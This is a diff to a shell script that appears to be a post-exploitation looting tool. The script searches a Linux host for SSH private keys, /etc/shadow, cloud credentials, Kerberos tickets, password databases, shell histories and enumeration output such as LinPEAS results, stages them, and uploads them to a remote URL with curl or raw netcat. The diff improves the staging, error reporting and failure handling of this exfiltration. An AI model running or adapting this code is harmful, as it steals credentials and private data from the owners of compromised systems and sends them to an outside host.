@@ -258,7 +258,7 @@ echo "Created staging directory: $STAGING_DIR"
 EXTENSIONS="pdf txt log zip doc docx xls xlsx ppt pptx csv ini conf cfg env
     yaml yml json xml kdbx rdp 7z rar tar gz bak old tmp db sqlite
     sqlite3 mdb accdb rtf md pem p12 pfx key crt cer p7b p7c
-    kerberoast kirb ccache hccapx wpa pcap pcapng cap kbx";
+    kerberoast kirb ccache hccapx wpa pcap pcapng cap kbx pyc";
 SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa id_ed25519 id_dsa \.git* /etc/passwd /etc/shadow
     .bash_history .zsh_history .mysql_history .psql_history .rediscli_history
     .ssh/known_hosts .ssh/config .aws/credentials .aws/config
@@ -297,13 +297,8 @@ for FILE in $SPECIFIC_FILES; do
     FIND_CMD="$FIND_CMD -o -name \"$FILE\"";
 done
 
-# Add output files (ensure they exist first)
-for FILE in "$OUTPUT_FILE" "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"; do
-    if [ -f "$FILE" ]; then
-        FILENAME=$(basename "$FILE");
-        FIND_CMD="$FIND_CMD -o -path \"$FILE\"";
-    fi
-done
+# Note: Enumeration output files are handled separately and copied to staging directory
+# No need to include them in the find command
 
 FIND_CMD="$FIND_CMD \\) 2>/dev/null";
 
@@ -363,6 +358,44 @@ STAGED_COUNT=$(wc -l < "$STAGED_FILES_LIST" 2>/dev/null || echo "0")
 
 echo "Successfully staged $STAGED_COUNT files to: $STAGING_DIR"
 
+# Copy enumeration output files to staging directory for upload
+echo "Copying enumeration output files to staging directory..."
+ENUM_FILES_ADDED=0
+for ENUM_FILE in "$OUTPUT_FILE" "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"; do
+    if [ -f "$ENUM_FILE" ]; then
+        FILENAME=$(basename "$ENUM_FILE")
+        TARGET_PATH="$STAGING_DIR/$FILENAME"
+        
+        # Handle conflicts by adding -1, -2, etc.
+        COUNTER=1
+        while [ -f "$TARGET_PATH" ]; do
+            BASE_NAME=$(echo "$FILENAME" | sed 's/\.[^.]*$//')
+            EXTENSION=$(echo "$FILENAME" | sed 's/.*\.//')
+            TARGET_PATH="$STAGING_DIR/${BASE_NAME}-${COUNTER}.${EXTENSION}"
+            COUNTER=$((COUNTER + 1))
+        done
+        
+        if cp "$ENUM_FILE" "$TARGET_PATH" 2>/dev/null; then
+            echo "Staged enumeration file: $FILENAME → $TARGET_PATH"
+            echo "$TARGET_PATH" >> "$STAGED_FILES_LIST"
+            ENUM_FILES_ADDED=$((ENUM_FILES_ADDED + 1))
+        else
+            echo "Failed to stage enumeration file: $FILENAME"
+        fi
+    else
+        echo "Enumeration file not found: $ENUM_FILE"
+    fi
+done
+
+# Update the staged count to include enumeration files
+STAGED_COUNT=$(wc -l < "$STAGED_FILES_LIST" 2>/dev/null || echo "0")
+echo "Added $ENUM_FILES_ADDED enumeration files to staging"
+echo "Total files staged (including enumeration outputs): $STAGED_COUNT"
+
+# Debug: Show contents of staging directory
+echo "Files in staging directory:"
+ls -la "$STAGING_DIR" 2>/dev/null || echo "Staging directory not accessible"
+
 # Now upload only the staged files
 if [ "$STAGED_COUNT" -eq 0 ] || [ "$STAGED_COUNT" -eq "0" ]; then
     echo "No files staged. Nothing to upload."
@@ -377,11 +410,17 @@ UPLOAD_COUNT=0
 SUCCESS_COUNT=0
 FAILED_COUNT=0
 
+# Debug: Show contents of staged files list
+echo "Contents of staged files list:"
+cat "$STAGED_FILES_LIST" 2>/dev/null || echo "Staged files list not accessible"
+
 # Upload staged files by reading from the temporary file
+echo "Starting upload process..."
 while IFS= read -r STAGED_FILE; do
     if [ -f "$STAGED_FILE" ]; then
         FILENAME=$(basename "$STAGED_FILE")
         UPLOAD_COUNT=$((UPLOAD_COUNT + 1))
+        echo "Uploading file $UPLOAD_COUNT: $FILENAME"
 
         # Show progress every 10 files or for the last file
         if [ $((UPLOAD_COUNT % 10)) -eq 0 ] || [ $UPLOAD_COUNT -eq $STAGED_COUNT ]; then
@@ -391,15 +430,27 @@ while IFS= read -r STAGED_FILE; do
         # Upload using curl with multipart form (silent)
 
         if  [ "$SYSTEM_HAS_CURL" -eq 1 ]; then
-            RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$URL" \
+            # Capture both response code and error output
+            CURL_OUTPUT=$(curl -s -w "%{http_code}" -X POST "$URL" \
                 -F "folder=$TARGET_FOLDER" \
                 -F "file=@$STAGED_FILE;filename=$FILENAME" \
-                -H "Expect:");
+                -H "Expect:" 2>&1)
+            
+            # Extract response code (last 3 characters)
+            RESPONSE="${CURL_OUTPUT: -3}"
+            
             # Check if upload was successful
             if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
                 SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
             else
                 FAILED_COUNT=$((FAILED_COUNT + 1))
+                echo "Upload failed for: $FILENAME"
+                echo "HTTP Response Code: $RESPONSE"
+                # Show curl error details (everything except the last 3 characters)
+                CURL_ERROR="${CURL_OUTPUT%???}"
+                if [ -n "$CURL_ERROR" ]; then
+                    echo "Error details: $CURL_ERROR"
+                fi
             fi
         else
             # Write data to temporary files to be able to handle binary data.
@@ -427,8 +478,8 @@ while IFS= read -r STAGED_FILE; do
             # Get accurate content length
             CONTENT_LENGTH=$(wc -c < "$TMPFILE");
 
-            # Send the HTTP request using netcat
-            {
+            # Send the HTTP request using netcat and capture any errors
+            NC_OUTPUT=$( {
             printf "POST / HTTP/1.1\r\n";
             printf "Host: %s:%s\r\n" "$URI" "$PORT";
             printf "Content-Type: multipart/form-data; boundary=%s\r\n" "$BOUNDARY";
@@ -436,15 +487,22 @@ while IFS= read -r STAGED_FILE; do
             printf "Expect:\r\n";
             printf "\r\n";
             cat "$TMPFILE";
-            } | nc "$URI" "$PORT" >/dev/null 2>&1;
+            } | nc "$URI" "$PORT" 2>&1)
+
+            NC_EXIT_CODE=$?
 
             # Clean up
             rm -f "$TMPFILE";
 
-            if [ $? -eq 0 ]; then
+            if [ $NC_EXIT_CODE -eq 0 ]; then
                 SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
             else
                 FAILED_COUNT=$((FAILED_COUNT + 1))
+                echo "Upload failed for: $FILENAME"
+                echo "Netcat exit code: $NC_EXIT_CODE"
+                if [ -n "$NC_OUTPUT" ]; then
+                    echo "Error details: $NC_OUTPUT"
+                fi
             fi
         fi
     fi
@@ -465,6 +523,19 @@ echo "==========================================================================
 echo ""
 
 echo "Upload complete! Total files uploaded: $UPLOAD_COUNT"
+
+# Check if any uploads failed and exit if so
+if [ "$FAILED_COUNT" -gt 0 ]; then
+    echo ""
+    echo "=================================================================================="
+    echo "                              UPLOAD FAILURES DETECTED"
+    echo "=================================================================================="
+    echo "  Upload failures detected - cleanup will not continue"
+    echo "  Failed uploads: $FAILED_COUNT"
+    echo "  Files remain in staging directory for manual collection"
+    echo "=================================================================================="
+    exit 1
+fi
 
 # Cleanup staging directory
 echo ""
